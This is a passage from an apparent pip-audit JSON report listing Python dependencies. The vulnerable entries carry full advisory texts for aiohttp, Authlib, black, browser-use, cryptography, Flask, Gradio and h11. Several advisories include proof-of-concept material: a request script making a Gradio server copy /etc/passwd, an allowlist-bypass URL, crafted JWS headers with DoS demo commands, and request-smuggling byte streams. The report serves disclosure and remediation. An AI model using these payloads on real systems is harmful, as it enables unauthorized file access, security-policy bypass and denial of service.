{"dependencies": [{"name": "absl-py", "version": "2.1.0", "vulns": []}, {"name": "accelerate", "version": "1.10.1", "vulns": []}, {"name": "affine", "version": "2.4.0", "vulns": []}, {"name": "aiofiles", "version": "23.2.1", "vulns": []}, {"name": "aiohappyeyeballs", "version": "2.4.4", "vulns": []}, {"name": "aiohttp", "version": "3.11.18", "vulns": [{"id": "GHSA-9548-qrrj-x5pj", "fix_versions": ["3.12.14"], "aliases": ["CVE-2025-53643"], "description": "### Summary The Python parser is vulnerable to a request smuggling vulnerability due to not parsing trailer sections of an HTTP request.  ### Impact If a pure Python version of aiohttp is installed (i.e. without the usual C extensions) or AIOHTTP_NO_EXTENSIONS is enabled, then an attacker may be able to execute a request smuggling attack to bypass certain firewalls or proxy protections.  ----  Patch: https://github.com/aio-libs/aiohttp/commit/e8d774f635dc6d1cd3174d0e38891da5de0e2b6a"}]}, {"name": "aiosignal", "version": "1.3.2", "vulns": []}, {"name": "aistudio-sdk", "version": "0.3.7", "vulns": []}, {"name": "altair", "version": "5.5.0", "vulns": []}, {"name": "annotated-types", "version": "0.7.0", "vulns": []}, {"name": "anthropic", "version": "0.42.0", "vulns": []}, {"name": "anthropic-cli", "version": "0.2.3", "vulns": []}, {"name": "anyio", "version": "4.9.0", "vulns": []}, {"name": "arcgis", "version": "2.4.1.1", "vulns": []}, {"name": "asttokens", "version": "3.0.0", "vulns": []}, {"name": "astunparse", "version": "1.6.3", "vulns": []}, {"name": "attrs", "version": "24.3.0", "vulns": []}, {"name": "authlib", "version": "1.5.2", "vulns": [{"id": "GHSA-9ggr-2464-2j32", "fix_versions": ["1.6.4"], "aliases": ["CVE-2025-59420"], "description": "## Summary Authlib\u2019s JWS verification accepts tokens that declare unknown critical header parameters (`crit`), violating RFC 7515 \u201cmust\u2011understand\u201d semantics. An attacker can craft a signed token with a critical header (for example, `bork` or `cnf`) that strict verifiers reject but Authlib accepts. In mixed\u2011language fleets, this enables split\u2011brain verification and can lead to policy bypass, replay, or privilege escalation.  ## Affected Component and Versions - Library: Authlib (JWS verification) - API: `authlib.jose.JsonWebSignature.deserialize_compact(...)` - Version tested: 1.6.3 - Configuration: Default; no allowlist or special handling for `crit`  ## Details RFC 7515 (JWS) \u00a74.1.11 defines `crit` as a \u201cmust\u2011understand\u201d list: recipients MUST understand and enforce every header parameter listed in `crit`, otherwise they MUST reject the token. Security\u2011sensitive semantics such as token binding (e.g., `cnf` from RFC 7800) are often conveyed via `crit`.  Observed behavior with Authlib 1.6.3: - When a compact JWS contains a protected header with `crit: [\"cnf\"]` and a `cnf` object, or `crit: [\"bork\"]` with an unknown parameter, Authlib verifies the signature and returns the payload without rejecting the token or enforcing semantics of the critical parameter. - By contrast, Java Nimbus JOSE+JWT (9.37.x) and Node `jose` v5 both reject such tokens by default when `crit` lists unknown names.  Impact in heterogeneous fleets: - A strict ingress/gateway (Nimbus/Node) rejects a token, but a lenient Python microservice (Authlib) accepts the same token. This split\u2011brain acceptance bypasses intended security policies and can enable replay or privilege escalation if `crit` carries binding or policy information.  ## Proof of Concept (PoC) This repository provides a multi\u2011runtime PoC demonstrating the issue across Python (Authlib), Node (`jose` v5), and Java (Nimbus).  ### Prerequisites - Python 3.8+ - Node.js 18+ - Java 11+ with Maven  ### Setup  Enter the directory **authlib-crit-bypass-poc** & run following commands. ```bash make setup make tokens ```  ### Tokens minted - `tokens/unknown_crit.jwt` with protected header:   `{ \"alg\": \"HS256\", \"crit\": [\"bork\"], \"bork\": \"x\" }` - `tokens/cnf_header.jwt` with protected header:   `{ \"alg\": \"HS256\", \"crit\": [\"cnf\"], \"cnf\": {\"jkt\": \"thumb-42\"} }`  ### Reproduction Run the cross\u2011runtime demo: ```bash make  demo ```  Expected output for each token (strict verifiers reject; Authlib accepts):  For `tokens/unknown_crit.jwt`: ``` Strict(Nimbus): REJECTED (unknown critical header: bork) Strict(Node jose): REJECTED (unrecognized crit) Lenient(Authlib): ACCEPTED -> payload={'sub': '123', 'role': 'user'} ```  For `tokens/cnf_header.jwt`: ``` Strict(Nimbus): REJECTED (unknown critical header: cnf) Strict(Node jose): REJECTED (unrecognized crit) Lenient(Authlib): ACCEPTED -> payload={'sub': '123', 'role': 'user'} ```  Environment notes: - Authlib version used: `1.6.3` (from PyPI) - Node `jose` version: `^5` - Nimbus JOSE+JWT version: `9.37.x` - HS256 secret is 32 bytes to satisfy strict verifiers: `0123456789abcdef0123456789abcdef`  ## Impact - Class: Violation of JWS `crit` \u201cmust\u2011understand\u201d semantics; specification non\u2011compliance leading to authentication/authorization policy bypass. - Who is impacted: Any service that relies on `crit` to carry mandatory security semantics (e.g., token binding via `cnf`) or operates in a heterogeneous fleet with strict verifiers elsewhere. - Consequences: Split\u2011brain acceptance (gateway rejects while a backend accepts), replay, or privilege escalation if critical semantics are ignored.  ## References - RFC 7515: JSON Web Signature (JWS), \u00a74.1.11 `crit` - RFC 7800: Proof\u2011of\u2011Possession Key Semantics for JWTs (`cnf`)"}, {"id": "GHSA-pq5p-34cr-23v9", "fix_versions": ["1.6.5"], "aliases": ["CVE-2025-61920"], "description": "**Summary** Authlib\u2019s JOSE implementation accepts unbounded JWS/JWT header and signature segments. A remote attacker can craft a token whose base64url\u2011encoded header or signature spans hundreds of megabytes. During verification, Authlib decodes and parses the full input before it is rejected, driving CPU and memory consumption to hostile levels and enabling denial of service.  **Impact**  - Attack vector: unauthenticated network attacker submits a malicious JWS/JWT.  - Effect: base64 decode + JSON/crypto processing of huge buffers pegs CPU and allocates large amounts of RAM; a single request can exhaust service capacity.  - Observed behaviour: on a test host, the legacy code verified a 500\u202fMB header, consuming ~4\u202fGB RSS and ~9\u202fs CPU before failing.  - Severity: High. CVSS v3.1: AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H (7.5).  Affected Versions Authlib \u2264\u202f1.6.3 (and earlier) when verifying JWS/JWT tokens. Later snapshots with 256\u202fKB header/signature limits are not affected.  **Proof of concept**  Local demo (do not run against third-party systems): Download [jws_segment_dos_demo.py](https://github.com/user-attachments/files/22450820/jws_segment_dos_demo.py) the PoC in direcotry authlib/ Run following Command ``` python3 jws_segment_dos_demo.py --variant both --sizes \"500MB\" --fork-per-case  ``` Environment: Python 3.13.6, Authlib 1.6.4, Linux x86_64, CPUs=8  Sample output: Refined <img width=\"1295\" height=\"306\" alt=\"image\" src=\"https://github.com/user-attachments/assets/6dd8410f-bc36-4717-8cee-649bac9bf291\" />     The compilation script prints separate \u201c[ATTACKER]\u201d (token construction) and \u201c[SERVER]\u201d (Authlib verification) RSS deltas so defenders can distinguish client-side preparation from server-side amplification. Regression tests authlib/tests/dos/test_jose_dos.py further capture the issue; the saved original_util.py/original_jws.py reproductions still accept the malicious payload.  **Remediation**  - Apply the upstream patch that introduces decoded size limits:  - MAX_HEADER_SEGMENT_BYTES = 256 KB  - MAX_SIGNATURE_SEGMENT_BYTES = 256 KB  - Enforce Limits in authlib/jose/util.extract_segment and _extract_signature.  - Deploy the patched release immediately.  - For additional defence in depth, reject JWS/JWT inputs above a few kilobytes at the proxy or WAF layer, and rate-limit verification endpoints.  **Workarounds (temporary)**  - Enforce input size limits before handing tokens to Authlib.  - Use application-level throttling to reduce amplification risk.  **Resources**  - Demo script: jws_segment_dos_demo.py  - Tests: authlib/tests/dos/test_jose_dos.py  - OWASP JWT Cheat Sheet (DoS guidance)"}, {"id": "GHSA-g7f3-828f-7h7m", "fix_versions": ["1.6.5"], "aliases": ["CVE-2025-62706"], "description": "### Summary _Authlib\u2019s JWE `zip=DEF` path performs unbounded DEFLATE decompression. A very small ciphertext can expand into tens or hundreds of megabytes on decrypt, allowing an attacker who can supply decryptable tokens to exhaust memory and CPU and cause denial of service._  ### Details - Affected component: Authlib JOSE, JWE `zip=DEF` (DEFLATE) support. - In `authlib/authlib/jose/rfc7518/jwe_zips.py`, `DeflateZipAlgorithm.decompress` calls `zlib.decompress(s, -zlib.MAX_WBITS)` without a maximum output limit. This permits unbounded expansion of compressed payloads. - In the JWE decode flow (`authlib/authlib/jose/rfc7516/jwe.py`), when the protected header contains `\"zip\": \"DEF\"`, the library routes the decrypted ciphertext into the `decompress` method and assigns the fully decompressed bytes to the plaintext field before returning it. No streaming limit or quota is applied. - Because DEFLATE achieves extremely high ratios on highly repetitive input, an attacker can craft a tiny `zip=DEF` ciphertext that inflates to a very large plaintext during decrypt, spiking RSS and CPU. Repeated requests can starve the process or host.  Code references (from this repository version): - `authlib/authlib/jose/rfc7518/jwe_zips.py` \u2013 `DeflateZipAlgorithm.decompress` uses unbounded `zlib.decompress`. - `authlib/authlib/jose/rfc7516/jwe.py` \u2013 JWE decode path applies `zip_.decompress(msg)` when `zip=DEF` is present in the header.  Contrast: The `joserfc` project guards `zip=DEF` decompression with a fixed maximum (256 KB) and raises `ExceededSizeError` if output would exceed this limit, preventing the bomb. Authlib lacks such a guard in this codebase snapshot.  ### PoC Environment: Python 3.10+ inside a venv; Authlib installed editable from this repository so source changes are visible. The PoC script demonstrates both a benign and a compressible-bomb payload and prints wall/CPU time, RSS, and size ratios.  1) Create venv and install Authlib (editable): Set current directory to /authlib Download [jwe_deflate_dos_demo.py](https://github.com/user-attachments/files/22519553/jwe_deflate_dos_demo.py) in /authlib ``` python3 -m venv .venv .venv/bin/pip install --upgrade pip .venv/bin/pip install -e . ```  2) Run the PoC (included in this repo): ``` .venv/bin/python /authlib/jwe_deflate_dos_demo.py --size 50 --max-rss-mb 2048 ```  Sample output (abridged): ``` LOCAL TEST ONLY \u2013 do not send to third-party systems. Runtime: Python 3.13.6 / Authlib 1.6.4 / zip=DEF via A256GCM [CASE] normal    plaintext=13B  ciphertext=117B decompressed=13B  wall_s=0.000 cpu_s=0.000 peak_rss_mb=31.0  ratio=0.1 [CASE] malicious plaintext=50MB ciphertext=~4KB decompressed=50MB wall_s=~2.3  cpu_s=~2.2  peak_rss_mb=800+  ratio=12500+ ```  The second case shows the decompression spike: a few KB of ciphertext forces allocation and processing of ~50 MB during decrypt. Repeated requests can quickly exhaust available memory and CPU.  Reproduction notes: - Algorithm: `alg=dir`, `enc=A256GCM`, header includes `{ \"zip\": \"DEF\" }`. - The PoC uses a 32\u2011byte local symmetric key and a highly compressible payload (`\"A\" * N`). - Increase `--size` to stress memory; the `--max-rss-mb` flag helps avoid destabilizing the host during testing.  ### Impact - Effect: Denial of service (memory/CPU exhaustion) during JWE decrypt of `zip=DEF` tokens. - Who is impacted: Any service that uses Authlib to decrypt JWE tokens with `zip=DEF` and where an attacker can submit tokens that will be successfully decrypted (e.g., shared `dir` key, token reflection, or compromised/abused issuers). - Confidentiality/Integrity: No direct C/I impact; availability impact is high.  ### Severity (CVSS v3.1) Base vector (typical shared\u2011secret scenario where the attacker must produce a decryptable token): - `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:H` \u2192 6.5 (MEDIUM)  **Rationale:** - Network\u2011reachable (AV:N), low complexity (AC:L), no user interaction (UI:N), scope unchanged (S:U). - Attacker must hold or gain ability to mint a decryptable token for the target (PR:L) \u2014 common with `alg=dir` and shared keys across services. - No confidentiality or integrity loss (C:N/I:N); availability is severely impacted (A:H) due to decompression expansion. If arbitrary unprivileged parties can submit JWEs that will be decrypted (PR:N), the base vector becomes: - `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H` \u2192 7.5 (HIGH)  ### Mitigations / Workarounds - Reject or strip `zip=DEF` for inbound JWEs at the application boundary until a fix is available. - Fork and add a bounded decompression guard (e.g., `zlib.decompress(..., max_length)` via `decompressobj().decompress(data, MAX_SIZE)`), returning an error when output exceeds a safe limit. - Enforce strict maximum token sizes and fail fast on oversized inputs; combine with rate limiting.  ### Remediation Guidance (for maintainers) - Mirror `joserfc`\u2019s approach: add a conservative maximum output size (e.g., 256 KB by default) and raise a specific error when exceeded; document a controlled way to raise this ceiling for trusted environments. - Consider streaming decode with chunked limits to avoid large single allocations.  ### References - Authlib source: `authlib/authlib/jose/rfc7518/jwe_zips.py`, `authlib/authlib/jose/rfc7516/jwe.py`"}]}, {"name": "autogen-core", "version": "0.0.2", "vulns": []}, {"name": "autogen-ext", "version": "0.0.1", "vulns": []}, {"name": "autogen-magentic-one", "version": "0.0.1", "vulns": []}, {"name": "automat", "version": "24.8.1", "vulns": []}, {"name": "av", "version": "13.1.0", "vulns": []}, {"name": "azure-cognitiveservices-vision-computervision", "version": "0.9.1", "vulns": []}, {"name": "azure-common", "version": "1.1.28", "vulns": []}, {"name": "azure-core", "version": "1.32.0", "vulns": []}, {"name": "backoff", "version": "2.2.1", "vulns": []}, {"name": "bce-python-sdk", "version": "0.9.46", "vulns": []}, {"name": "beautifulsoup4", "version": "4.12.3", "vulns": []}, {"name": "bitsandbytes", "version": "0.43.3", "vulns": []}, {"name": "black", "version": "23.12.1", "vulns": [{"id": "PYSEC-2024-48", "fix_versions": ["24.3.0"], "aliases": ["CVE-2024-21503"], "description": "Versions of the package black before 24.3.0 are vulnerable to Regular Expression Denial of Service (ReDoS) via the lines_with_leading_tabs_expanded function in the strings.py file. An attacker could exploit this vulnerability by crafting a malicious input that causes a denial of service.\r\rExploiting this vulnerability is possible when running Black on untrusted input, or if you habitually put thousands of leading tab characters in your docstrings."}]}, {"name": "bleach", "version": "6.2.0", "vulns": []}, {"name": "blinker", "version": "1.9.0", "vulns": []}, {"name": "boolean-py", "version": "5.0", "vulns": []}, {"name": "boto3", "version": "1.38.3", "vulns": []}, {"name": "botocore", "version": "1.38.3", "vulns": []}, {"name": "branca", "version": "0.8.1", "vulns": []}, {"name": "browser-use", "version": "0.1.41", "vulns": [{"id": "GHSA-x39x-9qw5-ghrf", "fix_versions": ["0.1.45"], "aliases": ["CVE-2025-47241"], "description": "### Summary   During a manual source code review, [**ARIMLABS.AI**](https://arimlabs.ai) researchers identified that the `browser_use` module includes an embedded whitelist functionality to restrict URLs that can be visited. This restriction is enforced during agent initialization. However, it was discovered that these measures can be bypassed, leading to severe security implications.    ### Details   **File:** `browser_use/browser/context.py`    The `BrowserContextConfig` class defines an `allowed_domains` list, which is intended to limit accessible domains. This list is checked in the `_is_url_allowed()` method before navigation:  ```python @dataclass class BrowserContextConfig:     \"\"\"     [STRIPPED]     \"\"\"     cookies_file: str | None = None     minimum_wait_page_load_time: float = 0.5     wait_for_network_idle_page_load_time: float = 1     maximum_wait_page_load_time: float = 5     wait_between_actions: float = 1      disable_security: bool = True      browser_window_size: BrowserContextWindowSize = field(default_factory=lambda: {'width': 1280, 'height': 1100})     no_viewport: Optional[bool] = None      save_recording_path: str | None = None     save_downloads_path: str | None = None     trace_path: str | None = None     locale: str | None = None     user_agent: str = (         'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36'     )      highlight_elements: bool = True     viewport_expansion: int = 500     allowed_domains: list[str] | None = None     include_dynamic_attributes: bool = True      _force_keep_context_alive: bool = False ``` The _is_url_allowed() method is responsible for checking whether a given URL is permitted: ```python def _is_url_allowed(self, url: str) -> bool:     \"\"\"Check if a URL is allowed based on the whitelist configuration.\"\"\"     if not self.config.allowed_domains:         return True      try:         from urllib.parse import urlparse          parsed_url = urlparse(url)         domain = parsed_url.netloc.lower()          # Remove port number if present         if ':' in domain:             domain = domain.split(':')[0]          # Check if domain matches any allowed domain pattern         return any(             domain == allowed_domain.lower() or domain.endswith('.' + allowed_domain.lower())             for allowed_domain in self.config.allowed_domains         )     except Exception as e:         logger.error(f'Error checking URL allowlist: {str(e)}')         return False ``` The core issue stems from the line `domain = domain.split(':')[0]`, which allows an attacker to manipulate basic authentication credentials by providing a username:password pair. By replacing the username with a whitelisted domain, the check can be bypassed, even though the actual domain remains different. ### Proof of Concept (PoC)  Set allowed_domains to ['example.com'] and use the following URL:  https://example.com:pass@localhost:8080  This allows bypassing all whitelist controls and accessing restricted internal services. ### Impact  - Affected all users relying on this functionality for security. - Potential for unauthorized enumeration of localhost services and internal networks. - Ability to bypass domain whitelisting, leading to unauthorized browsing."}]}, {"name": "build", "version": "1.2.2.post1", "vulns": []}, {"name": "cachecontrol", "version": "0.14.3", "vulns": []}, {"name": "cached-property", "version": "2.0.1", "vulns": []}, {"name": "cachetools", "version": "5.5.0", "vulns": []}, {"name": "certifi", "version": "2025.1.31", "vulns": []}, {"name": "cffi", "version": "1.17.1", "vulns": []}, {"name": "cfgv", "version": "3.4.0", "vulns": []}, {"name": "chardet", "version": "5.2.0", "vulns": []}, {"name": "charset-normalizer", "version": "3.4.1", "vulns": []}, {"name": "chex", "version": "0.1.7", "vulns": []}, {"name": "claude-agent-sdk", "version": "0.1.5", "vulns": []}, {"name": "claude-code-sdk", "version": "0.0.10", "vulns": []}, {"name": "cleo", "version": "2.1.0", "vulns": []}, {"name": "click", "version": "8.1.8", "vulns": []}, {"name": "click-plugins", "version": "1.1.1.2", "vulns": []}, {"name": "cligj", "version": "0.7.2", "vulns": []}, {"name": "cloudpickle", "version": "3.1.1", "vulns": []}, {"name": "cloup", "version": "3.0.5", "vulns": []}, {"name": "cobble", "version": "0.1.4", "vulns": []}, {"name": "cohere", "version": "5.15.0", "vulns": []}, {"name": "colorama", "version": "0.4.6", "vulns": []}, {"name": "coloredlogs", "version": "15.0.1", "vulns": []}, {"name": "colorlog", "version": "6.9.0", "vulns": []}, {"name": "constantly", "version": "23.10.4", "vulns": []}, {"name": "construct", "version": "2.10.70", "vulns": []}, {"name": "contourpy", "version": "1.3.1", "vulns": []}, {"name": "crashtest", "version": "0.4.1", "vulns": []}, {"name": "cryptography", "version": "43.0.3", "vulns": [{"id": "GHSA-79v4-65xg-pq4g", "fix_versions": ["44.0.1"], "aliases": ["CVE-2024-12797"], "description": "pyca/cryptography's wheels include a statically linked copy of OpenSSL. The versions of OpenSSL included in cryptography 42.0.0-44.0.0 are vulnerable to a security issue. More details about the vulnerability itself can be found in https://openssl-library.org/news/secadv/20250211.txt.  If you are building cryptography source (\"sdist\") then you are responsible for upgrading your copy of OpenSSL. Only users installing from wheels built by the cryptography project (i.e., those distributed on PyPI) need to update their cryptography versions."}]}, {"name": "curl-cffi", "version": "0.12.0", "vulns": []}, {"name": "cycler", "version": "0.12.1", "vulns": []}, {"name": "cyclonedx-python-lib", "version": "9.1.0", "vulns": []}, {"name": "cyclopts", "version": "3.23.1", "vulns": []}, {"name": "daily-codex", "skip_reason": "Dependency not found on PyPI and could not be audited: daily-codex (0.1.0)"}, {"name": "dask", "version": "2024.12.1", "vulns": []}, {"name": "dask-expr", "version": "1.1.21", "vulns": []}, {"name": "data", "version": "0.4", "vulns": []}, {"name": "datasets", "version": "3.2.0", "vulns": []}, {"name": "decorator", "version": "5.1.1", "vulns": []}, {"name": "defusedxml", "version": "0.7.1", "vulns": []}, {"name": "deprecated", "version": "1.2.15", "vulns": []}, {"name": "deprecation", "version": "2.1.0", "vulns": []}, {"name": "dill", "version": "0.3.8", "vulns": []}, {"name": "diskcache", "version": "5.6.3", "vulns": []}, {"name": "distlib", "version": "0.3.9", "vulns": []}, {"name": "distro", "version": "1.9.0", "vulns": []}, {"name": "dm-tree", "version": "0.1.8", "vulns": []}, {"name": "dnspython", "version": "2.7.0", "vulns": []}, {"name": "docker", "version": "7.1.0", "vulns": []}, {"name": "docker-pycreds", "version": "0.4.0", "vulns": []}, {"name": "docstring-parser", "version": "0.16", "vulns": []}, {"name": "docutils", "version": "0.22", "vulns": []}, {"name": "dol", "version": "0.3.20", "vulns": []}, {"name": "dropbox", "version": "12.0.2", "vulns": []}, {"name": "duckduckgo-search", "version": "7.2.0", "vulns": []}, {"name": "dulwich", "version": "0.22.8", "vulns": []}, {"name": "e2b", "version": "1.0.5", "vulns": []}, {"name": "e2b-code-interpreter", "version": "1.0.3", "vulns": []}, {"name": "einops", "version": "0.8.0", "vulns": []}, {"name": "email-validator", "version": "2.2.0", "vulns": []}, {"name": "entmax", "version": "1.3", "vulns": []}, {"name": "et-xmlfile", "version": "2.0.0", "vulns": []}, {"name": "etils", "version": "1.11.0", "vulns": []}, {"name": "exceptiongroup", "version": "1.3.0", "vulns": []}, {"name": "executing", "version": "2.2.0", "vulns": []}, {"name": "faiss-cpu", "version": "1.10.0", "vulns": []}, {"name": "fastapi", "version": "0.115.6", "vulns": []}, {"name": "fastavro", "version": "1.11.1", "vulns": []}, {"name": "fastjsonschema", "version": "2.21.1", "vulns": []}, {"name": "fastmcp", "version": "2.12.0", "vulns": []}, {"name": "feedparser", "version": "6.0.12", "vulns": []}, {"name": "ffmpeg-python", "version": "0.2.0", "vulns": []}, {"name": "ffmpy", "version": "0.5.0", "vulns": []}, {"name": "filelock", "version": "3.16.1", "vulns": []}, {"name": "filetype", "version": "1.2.0", "vulns": []}, {"name": "findpython", "version": "0.6.3", "vulns": []}, {"name": "firecrawl-py", "version": "1.9.0", "vulns": []}, {"name": "flake8", "version": "6.1.0", "vulns": []}, {"name": "flaml", "version": "2.3.2", "vulns": []}, {"name": "flask", "version": "3.1.0", "vulns": [{"id": "GHSA-4grg-w6v8-c28g", "fix_versions": ["3.1.1"], "aliases": ["CVE-2025-47278"], "description": "In Flask 3.1.0, the way fallback key configuration was handled resulted in the last fallback key being used for signing, rather than the current signing key.  Signing is provided by the `itsdangerous` library. A list of keys can be passed, and it expects the last (top) key in the list to be the most recent key, and uses that for signing. Flask was incorrectly constructing that list in reverse, passing the signing key first.  Sites that have opted-in to use key rotation by setting `SECRET_KEY_FALLBACKS` are likely to unexpectedly be signing their sessions with stale keys, and their transition to fresher keys will be impeded. Sessions are still signed, so this would not cause any sort of data integrity loss."}]}, {"name": "flask-sqlalchemy", "version": "3.1.1", "vulns": []}, {"name": "flatbuffers", "version": "24.3.25", "vulns": []}, {"name": "flax", "version": "0.7.5", "vulns": []}, {"name": "folium", "version": "0.19.6", "vulns": []}, {"name": "fonttools", "version": "4.55.3", "vulns": []}, {"name": "frozendict", "version": "2.4.6", "vulns": []}, {"name": "frozenlist", "version": "1.5.0", "vulns": []}, {"name": "fsspec", "version": "2024.9.0", "vulns": []}, {"name": "funcsigs", "version": "1.0.2", "vulns": []}, {"name": "future", "version": "1.0.0", "vulns": []}, {"name": "gast", "version": "0.6.0", "vulns": []}, {"name": "gcloud", "version": "0.18.3", "vulns": []}, {"name": "geomet", "version": "1.1.0", "vulns": []}, {"name": "geopandas", "version": "1.1.1", "vulns": []}, {"name": "git-filter-repo", "version": "2.47.0", "vulns": []}, {"name": "gitdb", "version": "4.0.11", "vulns": []}, {"name": "gitpython", "version": "3.1.43", "vulns": []}, {"name": "glcontext", "version": "3.0.0", "vulns": []}, {"name": "google", "version": "3.0.0", "vulns": []}, {"name": "google-adk", "version": "0.1.0", "vulns": []}, {"name": "google-ai-generativelanguage", "version": "0.6.10", "vulns": []}, {"name": "google-api-core", "version": "2.24.0", "vulns": []}, {"name": "google-api-python-client", "version": "2.166.0", "vulns": []}, {"name": "google-auth", "version": "2.37.0", "vulns": []}, {"name": "google-auth-httplib2", "version": "0.2.0", "vulns": []}, {"name": "google-auth-oauthlib", "version": "1.2.2", "vulns": []}, {"name": "google-cloud-aiplatform", "version": "1.88.0", "vulns": []}, {"name": "google-cloud-bigquery", "version": "3.27.0", "vulns": []}, {"name": "google-cloud-core", "version": "2.4.1", "vulns": []}, {"name": "google-cloud-resource-manager", "version": "1.14.0", "vulns": []}, {"name": "google-cloud-secret-manager", "version": "2.23.2", "vulns": []}, {"name": "google-cloud-speech", "version": "2.31.1", "vulns": []}, {"name": "google-cloud-storage", "version": "2.19.0", "vulns": []}, {"name": "google-cloud-trace", "version": "1.16.1", "vulns": []}, {"name": "google-crc32c", "version": "1.6.0", "vulns": []}, {"name": "google-genai", "version": "1.10.0", "vulns": []}, {"name": "google-generativeai", "version": "0.8.3", "vulns": []}, {"name": "google-pasta", "version": "0.2.0", "vulns": []}, {"name": "google-resumable-media", "version": "2.7.2", "vulns": []}, {"name": "googleapis-common-protos", "version": "1.65.0", "vulns": []}, {"name": "gotrue", "version": "2.12.0", "vulns": []}, {"name": "gradio", "version": "5.28.0", "vulns": [{"id": "GHSA-8jw3-6x8j-v96g", "fix_versions": ["5.31.0"], "aliases": ["CVE-2025-48889"], "description": "An arbitrary file copy vulnerability in Gradio's flagging feature allows unauthenticated attackers to copy any readable file from the server's filesystem. While attackers can't read these copied files, they can cause DoS by copying large files (like /dev/urandom) to fill disk space.  ### Description The flagging component doesn't properly validate file paths before copying files. Attackers can send specially crafted requests to the `/gradio_api/run/predict` endpoint to trigger these file copies.  **Source**: User-controlled `path` parameter in the flagging functionality JSON payload   **Sink**: `shutil.copy` operation in `FileData._copy_to_dir()` method  The vulnerable code flow: 1. A JSON payload is sent to the `/gradio_api/run/predict` endpoint 2. The `path` field within `FileData` object can reference any file on the system 3. When processing this request, the `Component.flag()` method creates a `GradioDataModel` object 4. The `FileData._copy_to_dir()` method uses this path without proper validation:  ```python def _copy_to_dir(self, dir: str) -> FileData:     pathlib.Path(dir).mkdir(exist_ok=True)     new_obj = dict(self)      if not self.path:         raise ValueError(\"Source file path is not set\")     new_name = shutil.copy(self.path, dir)  # vulnerable sink     new_obj[\"path\"] = new_name     return self.__class__(**new_obj) ``` 5. The lack of validation allows copying any file the Gradio process can read  ### PoC The following script demonstrates the vulnerability by copying `/etc/passwd` from the server to Gradio's flagged directory:   Setup a Gradio app:  ```python import gradio as gr  def image_classifier(inp):     return {'cat': 0.2, 'dog': 0.8}  test = gr.Interface(fn=image_classifier, inputs=\"image\", outputs=\"label\")  test.launch(share=True) ```  Run the PoC:  ```python import requests  url = \"https://[your-gradio-app-url]/gradio_api/run/predict\"   headers = {     \"Content-Type\": \"application/json\",       \"User-Agent\": \"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36\"  }  payload = {     \"data\": [         {             \"path\": \"/etc/passwd\",               \"url\": \"[your-gradio-app-url]\",             \"orig_name\": \"network_config\",              \"size\": 5000,               \"mime_type\": \"text/plain\",              \"meta\": {                 \"_type\": \"gradio.FileData\"               }         },         {}       ],     \"event_data\": None,     \"fn_index\": 4,      \"trigger_id\": 11,      \"session_hash\": \"test123\"   }  response = requests.post(url, headers=headers, json=payload) print(f\"Status Code: {response.status_code}\") print(f\"Response Body: {response.text}\") ```"}, {"id": "GHSA-wmjh-cpqj-4v6x", "fix_versions": [], "aliases": ["CVE-2025-5320"], "description": "A vulnerability classified as problematic has been found in gradio-app gradio up to 5.29.1. This affects the function is_valid_origin of the component CORS Handler. The manipulation of the argument localhost_aliases leads to origin validation error. It is possible to initiate the attack remotely. The complexity of an attack is rather high. The exploitability is told to be difficult. The exploit has been disclosed to the public and may be used. The vendor was contacted early about this disclosure but did not respond in any way."}]}, {"name": "gradio-client", "version": "1.10.0", "vulns": []}, {"name": "graphviz", "version": "0.20.3", "vulns": []}, {"name": "greenlet", "version": "3.1.1", "vulns": []}, {"name": "griffe", "version": "1.14.0", "vulns": []}, {"name": "groovy", "version": "0.1.2", "vulns": []}, {"name": "grpc-google-iam-v1", "version": "0.14.2", "vulns": []}, {"name": "grpcio", "version": "1.63.2", "vulns": []}, {"name": "grpcio-status", "version": "1.63.2", "vulns": []}, {"name": "grpcio-tools", "version": "1.63.2", "vulns": []}, {"name": "gunicorn", "version": "23.0.0", "vulns": []}, {"name": "h11", "version": "0.14.0", "vulns": [{"id": "GHSA-vqfr-h8mv-ghfj", "fix_versions": ["0.16.0"], "aliases": ["CVE-2025-43859"], "description": "### Impact  A leniency in h11's parsing of line terminators in chunked-coding message bodies can lead to request smuggling vulnerabilities under certain conditions.  ### Details  HTTP/1.1 Chunked-Encoding bodies are formatted as a sequence of \"chunks\", each of which consists of:  - chunk length - `\\r\\n` - `length` bytes of content - `\\r\\n`  In versions of h11 up to 0.14.0, h11 instead parsed them as:  - chunk length - `\\r\\n` - `length` bytes of content - any two bytes  i.e. it did not validate that the trailing `\\r\\n` bytes were correct, and if you put 2 bytes of garbage there it would be accepted, instead of correctly rejecting the body as malformed.  By itself this is harmless. However, suppose you have a proxy or reverse-proxy that tries to analyze HTTP requests, and your proxy has a _different_ bug in parsing Chunked-Encoding, acting as if the format is:  - chunk length - `\\r\\n` - `length` bytes of content - more bytes of content, as many as it takes until you find a `\\r\\n`  For example, [pound](https://github.com/graygnuorg/pound/pull/43) had this bug -- it can happen if an implementer uses a generic \"read until end of line\" helper to consumes the trailing `\\r\\n`.  In this case, h11 and your proxy may both accept the same stream of bytes, but interpret them differently. For example, consider the following HTTP request(s) (assume all line breaks are `\\r\\n`):  ``` GET /one HTTP/1.1 Host: localhost Transfer-Encoding: chunked  5 AAAAAXX2 45 0  GET /two HTTP/1.1 Host: localhost Transfer-Encoding: chunked  0 ```  Here h11 will interpret it as two requests, one with body `AAAAA45` and one with an empty body, while our hypothetical buggy proxy will interpret it as a single request, with body `AAAAXX20\\r\\n\\r\\nGET /two ...`. And any time two HTTP processors both accept the same string of bytes but interpret them differently, you have the conditions for a \"request smuggling\" attack. For example, if `/two` is a dangerous endpoint and the job of the reverse proxy is to stop requests from getting there, then an attacker could use a bytestream like the above to circumvent this protection.  Even worse, if our buggy reverse proxy receives two requests from different users:  ``` GET /one HTTP/1.1 Host: localhost Transfer-Encoding: chunked  5 AAAAAXX999 0 ```  ``` GET /two HTTP/1.1 Host: localhost Cookie: SESSION_KEY=abcdef... ```  ...it will consider the first request to be complete and valid, and send both on to the h11-based web server over the same socket. The server will then see the two concatenated requests, and interpret them as _one_ request to `/one` whose body includes `/two`'s session key, potentially allowing one user to steal another's credentials.  ### Patches  Fixed in h11 0.15.0.  ### Workarounds  Since exploitation requires the combination of buggy h11 with a buggy (reverse) proxy, fixing either component is sufficient to mitigate this issue.  ### 